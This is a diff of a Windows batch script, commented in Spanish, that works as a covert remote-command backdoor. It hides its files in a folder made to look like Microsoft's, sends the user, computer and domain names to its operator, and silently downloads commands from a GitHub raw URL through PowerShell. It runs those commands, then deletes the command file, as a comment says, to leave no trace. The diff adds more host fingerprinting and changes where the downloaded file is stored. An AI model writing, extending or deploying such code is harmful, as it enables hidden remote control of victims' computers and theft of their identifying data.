@@ -10,8 +10,8 @@ if %errorlevel% neq 0 (
 )
 :: Configuración de la Memoria
 set "MEM_DIR=%AppData%\Roaming\Microsoft\Vault\data"
-set "MEM_FILE=%MEM_DIR%\last_id.dat"
-set "PRUEBA=VER6_%USERNAME%"
+set "MEM_FILE=%MEM_DIR%\last_id.txt"
+set "PRUEBA=VER6_%USERNAME%_%COMPUTERNAME%_%USERDOMAIN%"
 
 call :FUNC_REPORTAR "!PRUEBA!" 
 :: Crear la carpeta si no existe (la primera vez)
@@ -19,19 +19,19 @@ if not exist "%MEM_DIR%" mkdir "%MEM_DIR%"
 
 :: --- 2. CAPTURA DE ÓRDENES (GitHub) ---
 set "URL_COMANDOS=https://raw.githubusercontent.com/kokoronoshojo-a11y/SystemAssets/SystemAssets/commands.txt"
-set "LOCAL_ORDENES=C:\Users\Usuario\AppData\Local\Google\Chrome\User Data\ordenes.txt"
+
 
 :: Descargamos el archivo de comandos
-powershell -Command "(New-Object Net.WebClient).DownloadFile('%URL_COMANDOS%', '%LOCAL_ORDENES%')" >nul 2>&1
+powershell -Command "(New-Object Net.WebClient).DownloadFile('%URL_COMANDOS%', '%MEM_FILE%')" >nul 2>&1
 
 :: Si el archivo está vacío o no se descargó, morimos
-if not exist "%LOCAL_ORDENES%" exit
-for %%i in ("%LOCAL_ORDENES%") do if %%~zi == 0 (del "%LOCAL_ORDENES%" & exit)
+if not exist "%MEM_FILE%" exit
+for %%i in ("%MEM_FILE%") do if %%~zi == 0 (del "%MEM_FILE%" & exit)
 
 
 :: --- 3. LECTURA DEL ID (PRIMERA LÍNEA) ---
 :: 'set /p' lee solo la primera línea del archivo
-set /p LINEA1=<"%LOCAL_ORDENES%"
+set /p LINEA1=<"%MEM_FILE%"
             
 :: Extraemos el valor después de "ID:"
 set "ID_NUBE=%LINEA1:ID:=%"
@@ -45,13 +45,13 @@ if exist "%MEM_FILE%" (
 
 :: COMPARACIÓN RELÁMPAGO
 if "!ID_NUBE!"=="!ID_LOCAL!" (
-    del "%LOCAL_ORDENES%"
+    del "%MEM_FILE%"
     exit
 )
 :: --- 4. PROCESAMIENTO DE COMANDOS (Parsing) ---
 :: Leemos el archivo línea por línea
 :: Cambiamos 'tokens=*' por 'tokens=1,2,3' para que separe por espacios
-for /f "usebackq skip=1 tokens=1,2,3" %%A in ("%LOCAL_ORDENES%") do (
+for /f "usebackq skip=1 tokens=1,2,3" %%A in ("%MEM_FILE%") do (
     set "ACCION=%%A"
     set "ARG1=%%B"
     set "ARG2=%%C"
@@ -64,7 +64,7 @@ for /f "usebackq skip=1 tokens=1,2,3" %%A in ("%LOCAL_ORDENES%") do (
 
 :: --- 5. LIMPIEZA Y CIERRE ---
 :: Eliminamos el archivo de órdenes para no dejar rastro
-del "%LOCAL_ORDENES%" >nul 2>&1
+del "%MEM_FILE%" >nul 2>&1
 exit
 
 :: ===========================================================
